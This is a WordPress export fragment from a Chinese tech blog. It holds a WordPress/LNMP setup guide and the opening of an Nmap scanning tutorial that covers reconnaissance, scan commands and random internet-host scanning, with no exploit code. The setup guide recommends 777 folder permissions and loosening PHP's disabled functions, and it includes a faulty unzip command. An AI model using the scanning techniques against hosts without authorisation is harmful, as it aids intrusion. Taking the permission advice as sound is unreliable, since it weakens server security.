		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>eye-scan</title>
		<link>https://www.nervgeek.com/eye-scan/</link>
		<pubDate>Thu, 04 Jul 2019 02:30:29 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/wp-content/uploads/2019/07/eye-scan.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4148</wp:post_id>
		<wp:post_date><![CDATA[2019-07-04 10:30:29]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-07-04 02:30:29]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[eye-scan]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[https://www.nervgeek.com/wp-content/uploads/2019/07/eye-scan.png]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2019/07/eye-scan.png]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:512;s:6:"height";i:512;s:4:"file";s:20:"2019/07/eye-scan.png";s:5:"sizes";a:4:{s:9:"thumbnail";a:4:{s:4:"file";s:20:"eye-scan-150x150.png";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:9:"image/png";}s:6:"medium";a:4:{s:4:"file";s:20:"eye-scan-300x300.png";s:5:"width";i:300;s:6:"height";i:300;s:9:"mime-type";s:9:"image/png";}s:14:"post-thumbnail";a:4:{s:4:"file";s:20:"eye-scan-150x150.png";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:9:"image/png";}s:19:"featured-post-image";a:4:{s:4:"file";s:20:"eye-scan-512x400.png";s:5:"width";i:512;s:6:"height";i:400;s:9:"mime-type";s:9:"image/png";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>cropped-eye-scan.png</title>
		<link>https://www.nervgeek.com/cropped-eye-scan-png/</link>
		<pubDate>Thu, 04 Jul 2019 02:30:31 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/wp-content/uploads/2019/07/cropped-eye-scan.png</guid>
		<description></description>
		<content:encoded><![CDATA[https://www.nervgeek.com/wp-content/uploads/2019/07/cropped-eye-scan.png]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4149</wp:post_id>
		<wp:post_date><![CDATA[2019-07-04 10:30:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-07-04 02:30:31]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[cropped-eye-scan-png]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[https://www.nervgeek.com/wp-content/uploads/2019/07/cropped-eye-scan.png]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2019/07/cropped-eye-scan.png]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_context]]></wp:meta_key>
		<wp:meta_value><![CDATA[site-icon]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:512;s:6:"height";i:512;s:4:"file";s:28:"2019/07/cropped-eye-scan.png";s:5:"sizes";a:8:{s:9:"thumbnail";a:4:{s:4:"file";s:28:"cropped-eye-scan-150x150.png";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:9:"image/png";}s:6:"medium";a:4:{s:4:"file";s:28:"cropped-eye-scan-300x300.png";s:5:"width";i:300;s:6:"height";i:300;s:9:"mime-type";s:9:"image/png";}s:14:"post-thumbnail";a:4:{s:4:"file";s:28:"cropped-eye-scan-150x150.png";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:9:"image/png";}s:19:"featured-post-image";a:4:{s:4:"file";s:28:"cropped-eye-scan-512x400.png";s:5:"width";i:512;s:6:"height";i:400;s:9:"mime-type";s:9:"image/png";}s:13:"site_icon-270";a:4:{s:4:"file";s:28:"cropped-eye-scan-270x270.png";s:5:"width";i:270;s:6:"height";i:270;s:9:"mime-type";s:9:"image/png";}s:13:"site_icon-192";a:4:{s:4:"file";s:28:"cropped-eye-scan-192x192.png";s:5:"width";i:192;s:6:"height";i:192;s:9:"mime-type";s:9:"image/png";}s:13:"site_icon-180";a:4:{s:4:"file";s:28:"cropped-eye-scan-180x180.png";s:5:"width";i:180;s:6:"height";i:180;s:9:"mime-type";s:9:"image/png";}s:12:"site_icon-32";a:4:{s:4:"file";s:26:"cropped-eye-scan-32x32.png";s:5:"width";i:32;s:6:"height";i:32;s:9:"mime-type";s:9:"image/png";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>记一次金山面试</title>
		<link>https://www.nervgeek.com/?p=4152</link>
		<pubDate>Mon, 30 Nov -0001 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=4152</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4152</wp:post_id>
		<wp:post_date><![CDATA[2019-07-08 14:26:22]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[0000-00-00 00:00:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>搭站</title>
		<link>https://www.nervgeek.com/2015/10/12/%e6%90%ad%e7%ab%99/</link>
		<pubDate>Sun, 11 Oct 2015 23:27:14 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=18</guid>
		<description></description>
		<content:encoded><![CDATA[无聊玩起搭搭站也是常有的事了，但经常在搭的时候，忘记上次是怎么做，该做什么了。我只能迷迷糊糊地谷歌百度了大半天才解决了相当白痴的问题。
所以现在就来记录一下吧！
首先用的是Liunx系统，搭LNMP还是LAMP我真没讲究，有精力比较熟悉的还是自己搭，贪方便就上一键吧。
一键lnmp下载：

<pre>CentOS系统下执行
wget -c http://soft.vpser.net/lnmp/lnmp1.1-full.tar.gz &amp;&amp; tar zxf lnmp1.1-full.tar.gz &amp;&amp; cdlnmp1.1-full &amp;&amp; ./centos.sh
Debian系统下执行：
wget -c http://soft.vpser.net/lnmp/lnmp1.1-full.tar.gz &amp;&amp; tar zxf lnmp1.1-full.tar.gz &amp;&amp; cd lnmp1.1-full &amp;&amp; ./debian.sh
Ubuntu系统下执行：
wget -c http://soft.vpser.net/lnmp/lnmp1.1-full.tar.gz &amp;&amp; tar zxf lnmp1.1-full.tar.gz &amp;&amp; cd lnmp1.1-full &amp;&amp; ./ubuntu.sh</pre>

中途要注册MySQL数据库账号，设置密码，然后一顿回车就好了，除非对版本有一定要求。<strong>但数据库账号密码务必牢记！</strong>
<!--more-->
编译安装的时间看机器性能决定，一般个人买的单核、512MB的服务器大概要10~15分钟左右。
安装完成后，在浏览器输入localhost、ip地址或者是域名，看到lnmp页面就代表安装成功了。
基本使用命令一般只用<strong>/root/lnmp restart</strong>，用处是重启LNMP。更多命令请进：<a href="http://lnmp.org/faq/lnmp-status-manager.html" target="_blank">http://lnmp.org/faq/lnmp-status-manager.html</a>
环境搭建到此就基本完成，但不是完美，毕竟是一键搭建的，对于优化请看搭建完WordPress后的优化教程。
&nbsp;
更多关于一键LNMP：<a href="http://lnmp.org/install.html">http://lnmp.org/install.html</a>
&nbsp;

<hr />

&nbsp;
网页服务器基本环境已经架设完毕了，现在开始下载安装WordPress吧！
进入/home/wwwroot，下载WordPress文件：
&nbsp;

<pre>wget http://cn.wordpress.org/wordpress-3.9-zh_CN.zip</pre>

使用unzip命令解压，例如

<pre>unzip http://cn.wordpress.org/wordpress-3.9-zh_CN.zip</pre>

解压完觉得压缩包没用就rm -rf wordpress-3.9-zh_CN.zip吧。不过建议还是暂时留着，用来还原，避免之后操作失误。
进入wordpress文件夹，用编辑器修改wp-config-sample.php文件。使用vi、vim都行，假如有乱码在命令模式下输入:set encoding=utf-8 fileencodings=utf-8（别忘了冒号
需要修改这三样：

<pre>/** WordPress数据库的名称 */
define('DB_NAME', 'database_name_here');
/** MySQL数据库用户名 */
define('DB_USER', 'username_here');
/** MySQL数据库密码 */
define('DB_PASSWORD', 'password_here');
</pre>

database_name_here的名称先写一个出来，等下进MySQL新建一个数据库。MySQL的用户名和密码在安装LNMP的中途就要求输入了，忘记的话重装或者百度下如何找回吧…
全部都输入好之后就保存退出。然后重命名文件，命令如下mv wp-config-sample.php wp-config.php
然后进MySQL新建数据库吧！
可以用LNMP自带的phpMyAdmin来新建，也可以在命令行下新建，其实都不麻烦，几步的事。
在命令行输入：

<pre>mysql -u root -p</pre>

然后提示输入密码
输入：

<pre>create database 数据库名;</pre>

退出MySQL命令

<pre>quit;</pre>

接着就可以去安装WordPress了，在浏览器输入localhost、ip地址或者是域名，进入了WordPress的安装程序，根据提示填完资料按下一步，等一会儿就安装完毕。
&nbsp;
:d:接下来就要去找主题了，这博客用的是PadHang主题，好处在于首页预览支持HTML代码，例如视频啊音频啊。
假如安装主题时出错，先去命令行输入

<pre>chown -R www /home/wwwroot/wordpress</pre>

或者用FTP软件给wordpress文件夹赋予777权限。
还有时候会遇到。艾玛！  这装了主题看不到呀，那就需要在/usr/local/php/etc/下修改php.ini，找到disable_functions函数，把后面的scandir删除掉，重启lnmp，就能看见了。
但是！几乎所有主题都不带登陆框，这个要自己添加了。
主题的位置一般在

<pre>/home/wwwroot/wordpress/wp-content/themes/主题的名字</pre>

在主题的文件夹里找到index.php，在适当的位置加入

<pre>
<div style="font-family:'Microsoft YaHei'">
 <?php if (!(current_user_can('level_0'))){ ?>
 <div>
 <div style="margin-top:-25px;padding-bottom:-20x;;margin-left:55px;">
 <h5 id="login_text">登录</h5>
 <form style="margin-left:15px;" id="user_name"action="<?php echo get_option('home'); ?>/wp-login.php" method="post">
 用户：
 <input type="text" name="log" id="log" value="<?php echo wp_specialchars(stripslashes($user_login), 1) ?>Username" size="18" onfocus="if (this.value == 'Username') {this.value = '';}" onblur="if (this.value == '') {this.value = 'Username';}" onmouseover="this.style.backgroundColor='#F0FFF0'" onmouseout="this.style.backgroundColor='#ffffff'"/>
 <span>
 密码：
 <input type="password" name="pwd" id="pwd" size="18" value="请输入密码*" onfocus="if (this.value == '请输入密码*') {this.value = '';}" onblur="if (this.value == '') {this.value = '请输入密码*';}" onmouseover="this.style.backgroundColor='#F0FFF0'" onmouseout="this.style.backgroundColor='#ffffff'"/>
 </span>
 <label for="rememberme">
 <input id="remember_me"name="rememberme" id="rememberme" type="checkbox" checked="checked" value="forever" />记住我</label>
 <input type="submit" id="sure" name="submit" value="确定" class="button" />
 <span id="find_pw">
 <a href="<?php echo get_option('home'); ?>/wp-login.php?action=lostpassword">找回密码</a>
 </span>
 <span id="register">
 <a href="<?php echo get_option('home'); ?>/wp-login.php?action=register">注册</a>
 </span>
 <input type="hidden" name="redirect_to" value="<?php echo $_SERVER['REQUEST_URI']; ?>" /> </p></form>
 </div>
 <?php } else { ?>
 <div style="margin-top:-25px;margin-left:55px;">
 <h5 id="user_text">用户</h5>
 <div style="margin-top:-10px;margin-bottom:23px;">
 <span id="user_n"><?php echo $user_identity ?></span>
 <span style="margin-left:65px"><a href="<?php bloginfo('url') ?>/wp-admin/">管理界面</a></span>
 <?php if ( $user_level >= 1 ) : ?>
 <span style="margin-left:65px"><a href="<?php bloginfo('url') ?>/wp-admin/post-new.php">立马投稿</a></span>
 <?php endif // $user_level >= 1 ?>
 <span style="margin-left:65px"><a href="<?php bloginfo('url') ?>/wp-admin/edit.php">我的编辑</a></span>
 <span style="margin-left:65px"><a href="<?php bloginfo('url') ?>/wp-admin/profile.php">个人资料</a></span>
 <span style="margin-left:65px"><a href="<?php bloginfo('url') ?>/wp-login.php?action=logout&amp;redirect_to=<?php echo urlencode($_SERVER['REQUEST_URI']) ?>">退出</a></span><?php }?>
 </div>
</pre>

然后加入CSS，这个登陆框部分css写在了html里面，就在上面的代码里，修改css需要修改两边了，在style.css加入：

<pre>/*登陆面版样式*/
/*登陆*/
#login_text{
font-size:2.10em;
}
#user_name{
display: inline;
}
#sure{
height:43px;
width:90px;
margin-left: 120px;
}
#user_text{
font-size:2.10em;
}
#user_n{
margin-left: 75px;
font-size: 1.3em;
}
</pre>

这样就实现了在首页登陆的功能了！
接下来安装插件吧，本博客用到的插件有：

<pre>1、Akismet
   自带的阻止垃圾评论插件，需要激活拿API。
2、Custom Smilies
   表情插件，可以在评论和文章中加入表情，需要插入代码。
3、JiaThis分享工具
   国内一款不错的分享工具，可定义样式。
4、WPtouch Mobile Plugin
   手机端响应式主题，免费版只有一个主题。
5、TinyMCE Advanced
   文章编辑器加强插件，自定义编辑器功能，非常实用。
<code lang="language"><code>
6、WP Super Cache
   非常好用的缓存插件，提速超明显！
7、DB Cache Reloaded Fix
   数据库缓存插件，听说配合Hyper Cache这个缓存插件效果更佳，但我还是选择了WP Super Cache。</code></code></pre>

需要注意的是，一旦启用了JiaThis分享工具，主题的自定义功能就有问题，建议先修改好在启用JiaThis分享工具。
Custom Smilies表情插件需要插入代码，在评论页面里插入适当位置。
在wordpress/wp-includes/里打开comment-template.php，在适当的位置加入：

<pre><?php if (function_exists(cs_print_smilies)) {cs_print_smilies();}?></pre>

然后去插件里面设置表情快捷代码，表情文件夹在/home/wwwroot/wordpress/wp-includes/images/smilies/
使用WP Super Cache插件时进入插件设置，会提示固定链接结构什么的，需要在 设置  —&gt;  固定链接，选择除了默认和文章名的方式，就可以顺利进入插件后台设置了。
但当点击文章的时候，会弹出404页面 ，这时候就需要做伪静态了，在/usr/local/nginx/conf里，编辑nginx.conf，在  server   { } 大括号里面添加下面的代码：

<pre class="php">location / {
if (-f $request_filename/index.html){
 rewrite (.*) $1/index.html break;
 }
if (-f $request_filename/index.php){
 rewrite (.*) $1/index.php;
 }
if (!-f $request_filename){
 rewrite (.*) /index.php;
 }
}
</pre>

更多
关于折叠功能：<a href="http://xiaoxia.de/collapse-and-protect-text-by-shortcode-in-wordpress/" target="_blank">http://xiaoxia.de/collapse-and-protect-text-by-shortcode-in-wordpress/</a>
去除wordpress评论框下面的“您可以使用这些 HTML 标签和属性:<a href="http://www.qijiannet.com/wordpress/663.html" target="_blank">http://www.qijiannet.com/wordpress/663.html</a>
WordPress 开启多站点（含Apache和Nginx伪静态规则）：<a href="http://www.wpdaxue.com/wordpress-multisite.html" target="_blank">http://www.wpdaxue.com/wordpress-multisite.html</a>
关于优化：<a href="http://www.wpdaxue.com/disable-autop.html" target="_blank">http://www.wpdaxue.com/disable-autop.html</a>
优化php参数：
wordpress优化实战一~五：
1、<a href="http://blog.alonestar.org/2014/03/736/" target="_blank">http://blog.alonestar.org/2014/03/736/</a>
2、<a href="http://blog.alonestar.org/2014/03/755/" target="_blank">http://blog.alonestar.org/2014/03/755/</a>
3、<a href="http://blog.alonestar.org/2014/03/767/" target="_blank">http://blog.alonestar.org/2014/03/767/</a>
4、<a href="http://blog.alonestar.org/2014/03/798/" target="_blank">http://blog.alonestar.org/2014/03/798/</a>
5、<a href="http://blog.alonestar.org/2014/04/821/" target="_blank">http://blog.alonestar.org/2014/04/821/</a>
WordPress加速缓存插件WP Super cache安装方法及使用技巧：<a href="http://www.freehao123.com/wp-super-cache/" target="_blank">http://www.freehao123.com/wp-super-cache</a>/
&nbsp;

<div><small>来源： &lt;<a href="https://www.nervgeek.com/archives/25">https://www.nervgeek.com/archives/25</a><small>&gt;</small></small></div>

<small><small> </small></small>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>18</wp:post_id>
		<wp:post_date><![CDATA[2015-10-12 07:27:14]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-11 23:27:14]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%90%ad%e7%ab%99]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="wordpress"><![CDATA[wordpress]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be"><![CDATA[网站建设]]></category>
		<category domain="post_tag" nicename="%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be"><![CDATA[网站建设]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[343]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Nmap从探测到漏洞利用备忘录 – Nmap简介(一)</title>
		<link>https://www.nervgeek.com/2015/10/12/123/</link>
		<pubDate>Mon, 12 Oct 2015 06:03:48 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=31</guid>
		<description></description>
		<content:encoded><![CDATA[在侦查期间，扫描一直是信息收集的初始阶段。

<h2 id="_1"><strong>什么是侦查</strong></h2>

侦查是尽可能多收集关于目标网络的信息。从黑客的角度来看，信息收集对于一次攻击非常有用，所以为了封锁恶意的企图，渗透测试者通常尽力查找这些信息，发现后修复这个缺陷。这也被叫做踩点。通过信息收集，人们通常会发现如下类型的信息：
-  E-mail 地址
- 端口号/协议
- 操作系统信息
- 运行的服务
- Traceroute 信息/DNS 信息
- 防火墙标识和绕过
- 其他
所以对于信息收集，扫面是第一个部分。在扫面阶段，Nmap对于发现开放端口，协议号，操作系统信息，防火墙信息等是一个非常有用的工具。
<!--more-->

<h2 id="nmap"><strong>Nmap 介绍</strong></h2>

Nmap (网络映射器)是一个开源工具，它使网络探测和安全审计得以专业化。最初由 Gordon “Fyodor” Lyon 发布。官网官方网站是<a title="" href="http://nmap.org/" target="_blank">http://nmap.org</a>. Nmap是一个免费的用来实现网络探测和安全审计的开源程序。许多系统和网络管理员发现它对于一些日常的工作也有帮助。例如查看整个网络的信息，管理服务升级计划以及监控主机和服务的正常运行。
Nmap采用一种新颖的方式利用原始IP包来决定网络上是什么样的主机，这些主机提供什么样的服务（应用程序名和版本），它们运行着什么样的操作系统（操作系统版本）它们使用什么类型的过滤器/防火墙以及许多其他的特征。它虽然被设计用来快速扫描大型网络，但是在单个主机上也会工作的非常好。Nmap可以运行在所有的主流计算机操作系统上，Linux，Windows，Mac OS X都可以找到官方的安装包。

<h2 id="nmap_1"><strong>安装Nmap</strong></h2>

Nmap 对于不同的环境有着非常好的支持。
Windows: 从官方网站安装 <a title="" href="http://nmap.org/" target="_blank">http://nmap.org</a>。windows上的所有图形用户界面和命令行都可以从官网上找到。Nmap的图形用户界面采用的是Zenmap。
Linux (Ubuntu and Debian): 在Linux终端上运行如下命令：<code>apt-get install nmap</code>
如下的图片中，我已经安装好了Nmap。
<a class="highslide-image" target="_blank"><img title="1.png" alt="" data-original="" /></a>
基于Red Hat 和 Fedora 的系统: <code>yum install nmap</code>
基于Gentoo Linux 的系统： <code>emerge nmap</code>
接下来，我所有的操作将会用Linux终端来演示：

<h2 id="nmap_2"><strong>Nmap脚本引擎</strong></h2>

Nmap脚本引擎 (NSE) 是Nmap最有力灵活的的一个特性。它允许用户撰写和分享一些简单的脚本来一些较大的网络进行扫描任务。基本上这些脚本是用Lua编程语言来完成的。通常Nmap的脚本引擎可以完成很多事情，下面是其中的一部分：

<h3 id="_2"><strong>网络探测</strong></h3>

这是Nmap的基础功能。例如查询目标域名的WhoIs数据，查询目标IP的ARIN, RIPE, 或者 APNIC 来确定所有者，对开放端口执行鉴别查询，SNMP 查询以及列出可用的NFS/SMB/RPC 分享和服务。

<h3 id="_3"><strong>漏洞检测</strong></h3>

当一个新的漏洞被发现，你会想要在坏家伙行动之前快速扫描你的网络来识别含有漏洞的系统。因为Nmap不是一个专业的漏洞扫描器，而NSE用来处理这种需求的漏洞检查是足够的。现在已经有很多漏洞检测脚本可用，并且他们计划发布更多。
许多攻击者和一些自动化的蠕虫留下一些后门使得攻击者之后能重入。他们中的等一些可用被Nmap的正则表达式版本检测到。

<h3 id="_4"><strong>漏洞利用</strong></h3>

作为一个通用的脚本语言，可以使用NSE来执行漏洞利用而不仅仅局限于发现漏洞。这种添加自定义漏洞利用脚本的功能对于一些人（尤指渗透测试者）是很有价值的，尽管他们不打算将Nmap变成一个像Metasploit一样的漏洞利用框架。
正如下面你将会看到的，我已经使用了（-sc）选项（或者-script），它是一个扫描目标网络的默认脚本。你可以看到我们得到了ssh，rpcbind，netbios-sn，但是端口是过滤的或者关闭的，所以我们可以说这里可能有一个防火墙来封堵我们的请求。稍后我们将会讨论怎么识别防火墙并尝试绕过它们。
<a class="highslide-image" target="_blank"><img title="2.png" alt="" data-original="" /></a>
现在我已经用探测模式运行了一个ping扫描脚本，它将会尝试所有可能扫描的方法，这样我们将会得到更多的有用的信息。
<a class="highslide-image" target="_blank"><img title="3.png" alt="" data-original="" /></a>
正如你在图片中看到的，它将会尝试按照脚本规则的所有可能的办法。在下一张途中可以看到更多信息。
你能看到有趣的协议和端口么？你可以看到dns-bruteforce发现了一个包含一些博客，内容管理系统，sql，记录，邮件以及许多其他信息的主机。所以我们可以执行sql注入，这个博客可能是WordPress，Joomal等等。我们可以利用一些已知的CMS漏洞执行攻击，很明显这些方法将会是一个黑盒测试。
在下面的一节中，我将会阐述怎么撰写你自己的Nmap脚本引擎，以及怎样用Nmap来利用他们。

<h2 id="_5"><strong>基本的扫描技术</strong></h2>

接下来我将会演示一些基本的扫描技术。但是在那之前，你应该知道一些关于Nmap扫描后状态的的基本知识。
端口状态：扫描之后，你可能会看到一些端口状态如 open(开放的)，filtered(被过滤的)，closed(关闭的)等等。我来对此解释下。
- Open(开放的): 应用程序正在这个端口上监听连接。
- Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。
- Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。
- Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。
- Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。
- Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。

<h2 id="_6"><strong>开始扫描主机</strong></h2>

<h3 id="_7"><strong>扫描单个网络</strong></h3>

在你的Nmap(Windows/Linux)上运行如下命令: <code>nmap 192.168.1.1(or) host name</code>。
<a class="highslide-image" target="_blank"><img title="5.png" alt="" data-original="" /></a>

<h3 id="_8"><strong>扫描多个网络目标</strong></h3>

你可以用Nmap扫描多个目标来发现主机或者收集信息。
命令: <code>nmap host1 host2 host3 etc….</code> 它会扫面不同的IP地址和整个子网。
<a class="highslide-image" target="_blank"><img title="6.png" alt="" data-original="" /></a>
你也可以用相同的命令一次扫描多个网络网站域名。如下图所示。它将会把域名转换成对应的IP地址，并扫描它。
<a class="highslide-image" target="_blank"><img title="7.png" alt="" data-original="" /></a>

<h3 id="ip">扫描IP地址段</h3>

命令:<code>nmap 192.168.2.1-192.168.2.100</code>
Nmap 可以用来扫描用CIDR格式表示的整个子网。

<h3 id="nmap-cidr"><strong>使用语法: nmap [CIDR格式的网络地址]</strong></h3>

例如:<code>nmap 192.168.2.1/24</code>

<h3 id="_9"><strong>扫描目标列表</strong></h3>

如果你有大量的系统需要扫描，你可以将这些IP地址（或主机名）输入到一个文本文件中，用这个文本文件的内容来作为Nmap命令行的输入。
语法: <code>nmap -iL [list.txt]</code>

<h3 id="_10"><strong>扫描随机目标</strong></h3>

“-iR” 参数可以用来选择随机的互联网主机来扫描。Nmap将会随机的生成指定数量的目标进行扫描。
语法: <code>nmap -iR [主机数量]</code>
除非你有一些这种类型的任务，否则随机扫描不是一个好习惯。

<h3 id="exclude"><strong>" –exclude "选项被用来从扫描中排除一些主机</strong></h3>

语法: <code>nmap [目标] –exclude [主机]</code>
例如:<code>nmap 192.168.2.1/24 –exclude 192.168.2.10</code>

<h3 id="_11"><strong>激烈扫描</strong></h3>

激烈扫描模式会选择Nmap中最常用的选项来尝试代替输入很长的字符串。它对于路由跟踪也适用。
命令:<code>nmap –A host</code>

<h3 id="nmap_3"><strong>用Nmap来探测</strong></h3>

用Nmap来探测对于渗透测试者来说是非常有意思而且非常有用的。在探测中，可以发现服务，端口号，防火墙，协议，操作系统等等。我们解析来一个一个的讨论。

<h3 id="ping"><strong>不用ping</strong></h3>

" -PN "选项告诉Nmap不使用默认的探测检查，而是对目标进行一个完整的端口扫描。当我们扫描一个有防火墙保护而封锁 ping 探针主机的时候是非常有用的。
语法:<code>nmap –PN Target</code>
<a class="highslide-image" target="_blank"><img title="8.png" alt="" data-original="" /></a>
通过指定这些选项，Nmap将会不用ping来发现那些不能ping通主机开放的端口。

<h3 id="ping_1"><strong>只是扫描的ping</strong></h3>

“ -Sp ” 选项告诉Nmap仅仅进行ping扫描。 当你有一组IP地址来扫描时，而且你不知道哪一个是可达的，这时这个选项会很有用。通过指定一个特定的目标，你可以得到像MAC地址这样更多的信息。
语法:<code>nmap –Sp target</code>
<a class="highslide-image" target="_blank"><img title="9.png" alt="" data-original="" /></a>

<h3 id="tcp-syn"><strong>TCP SYN 扫描</strong></h3>

在我们开始之前，我们必须知道syn包。
基本上来说，一个syn包是用来在两个通信的主机之间初始化连接。
TCP SYN ping 发送一个SYN包给目标系统，然后监听目标系统的响应。 这种探测方法对于那些配置好封锁标准ICMP ping的系统来说很有用。
